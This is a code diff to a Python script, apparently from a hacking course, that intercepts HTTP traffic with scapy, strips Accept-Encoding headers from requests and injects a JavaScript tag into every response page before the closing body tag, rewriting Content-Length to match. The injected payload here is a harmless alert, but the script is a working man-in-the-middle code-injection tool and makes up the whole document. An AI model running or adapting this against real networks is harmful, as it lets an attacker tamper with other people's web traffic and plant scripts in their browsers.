@@ -12,18 +12,23 @@ def process_packet(packet):
         encoding_pattern = "Accept-Encoding:.*?\\r\\n"
         content_length_pattern = "(?:Content-Length:\s)(\d*)"
         if scapy_packet[TCP].dport == 80:
-            print("\n[+] This is an HTTP Request:")
+            print("\n[+] HTTP Request:")
             load = re.sub(encoding_pattern, "", load)
         elif scapy_packet[TCP].sport == 80:
-            print("\n[+] This is a HTTP Response:\n")
+            print("\n[+] HTTP Response:\n")
             # print(scapy_packet.show())
-            load = load.replace("</body>", "<script>alert('Hello World!')</script></body>")
+            injection_code = "<script>alert('Hello World!')</script>"
+            load = load.replace("</body>", injection_code + "</body>")
             content_length_search = re.search(content_length_pattern, load)
             if content_length_search:
+                print("[+] This is our content length search: ")
+                print(content_length_search.group(1))
                 content_length = content_length_search.group(1)
-                print("\n\n[+] This is our Content Length:")
-                print(content_length)
-
+                new_content_length = int(content_length) + len(injection_code)
+                print("[+] This is our New Content length: ")
+                print(new_content_length)
+                load = load.replace(content_length, str(new_content_length))
+        # Detect if the load has been modified, if it has then update the packet with the new_packet
         if load != scapy_packet[Raw].load:
             new_packet = set_load(scapy_packet, load)   # Create a new packet with the modified load
             packet.set_payload(str(new_packet))         # Set the new packet as the main packet
